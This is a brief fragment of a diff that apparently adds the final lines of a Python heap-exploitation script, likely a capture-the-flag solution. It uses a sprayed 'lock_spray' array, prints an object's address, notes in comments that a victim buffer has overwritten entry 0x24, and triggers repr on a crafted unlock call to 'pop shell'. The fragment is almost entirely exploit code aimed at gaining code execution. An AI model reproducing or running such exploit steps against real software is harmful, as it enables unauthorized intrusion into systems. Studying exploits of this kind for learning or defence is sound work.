+print_(hex(id(lock_spray[0x24])))
+
+# now, victim's buffer should have overwritten 0x24's buffer
+# trigger repr to pop shell
+repr(lock_spray[0x24].unlock(p64(0x100)))
+```
